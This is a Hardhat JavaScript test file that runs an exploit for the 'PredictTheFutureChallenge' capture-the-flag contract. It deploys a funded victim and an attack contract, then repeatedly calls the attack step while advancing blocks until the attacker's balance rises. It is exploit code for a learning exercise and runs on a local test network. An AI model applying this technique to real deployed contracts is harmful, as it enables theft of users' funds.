const { ethers } = require("hardhat");
const { expect } = require("chai");

const BigNumber = ethers.BigNumber;


describe("PredictTheFutureChallenge", function () {
    let contract;
    let owner;
    let attacker;


    this.beforeEach(async function () {
        [owner, attacker] = await ethers.getSigners();
        console.log("Constructor");
        const PredictTheFutureChallengeContract = await ethers.getContractFactory("PredictTheFutureChallenge");
        let victimContract = await PredictTheFutureChallengeContract.deploy({value: ethers.utils.parseEther("1")});
        await victimContract.deployed()
        const PredictTheFutureAttackContract = await ethers.getContractFactory("PredictTheFutureAttack");
        contract = await PredictTheFutureAttackContract.deploy(victimContract.address);
        await contract.deployed()
    });

    describe("attacker", function () {
        it("Exploit PredictTheFutureChallenge", async function () {
            let balance = await ethers.provider.getBalance(attacker.address);
            await contract.connect(attacker).attackStep1({value: ethers.utils.parseEther("1")});
            let i = 0;
            do {
                try {
                    let txn = await contract.connect(attacker).attackStep2();
                    i = -1;
                } catch(error) {
                    await network.provider.send("evm_increaseTime", [3600])
                    await network.provider.send("evm_mine")
                    console.log(i);
                    i ++;
                };
            } while(i != -1);
            expect(await ethers.provider.getBalance(attacker.address)).to.be.greaterThan(balance);
        });
    });
});
